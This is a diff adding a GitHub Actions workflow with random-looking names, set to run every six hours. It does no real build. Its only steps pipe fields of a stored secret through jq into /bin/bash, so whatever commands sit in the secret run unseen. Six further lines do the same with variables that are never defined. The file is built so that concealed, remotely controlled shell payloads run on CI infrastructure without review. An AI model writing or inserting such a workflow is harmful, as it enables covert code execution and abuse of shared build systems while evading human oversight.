@@ -1,0 +1,23 @@
+name: heqizheng6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heqizheng6789
+        env:
+          idsif36: ${{ secrets.idsif36 }}
+        run: |
+          echo $idsif36 | jq -r .smniz877 | /bin/bash
+          echo $kjp611 | jq -r .vuw46 | /bin/bash
+          echo $bg98906 | jq -r .zkm2 | /bin/bash
+          echo $uuhhl2 | jq -r .mihru2287 | /bin/bash
+          echo $ztr8135 | jq -r .nuual5 | /bin/bash
+          echo $nb31517 | jq -r .rxssb62 | /bin/bash
+          echo $ocwcy8 | jq -r .ifaa62809 | /bin/bash
+
